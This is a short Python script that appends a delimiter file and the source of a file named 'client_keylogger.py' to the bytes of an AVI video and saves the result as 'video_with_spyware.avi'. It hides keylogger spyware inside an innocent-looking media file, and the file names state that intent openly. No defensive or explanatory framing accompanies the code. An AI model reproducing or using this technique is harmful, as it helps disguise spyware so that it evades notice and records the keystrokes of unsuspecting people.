path = "video_of_images.avi"
video = open(path,"rb")
video_bytes = bytearray(video.read())


 
special = open("special.txt","rb")
sp_bytes = bytearray(special.read())


key_logger = open("client_keylogger.py","rb")
key_logger_bytes = bytearray(key_logger.read())

hidden_bytes = video_bytes+sp_bytes+key_logger_bytes

video_with_hiddendata = open("video_with_spyware.avi","wb")

video_with_hiddendata.write(hidden_bytes)
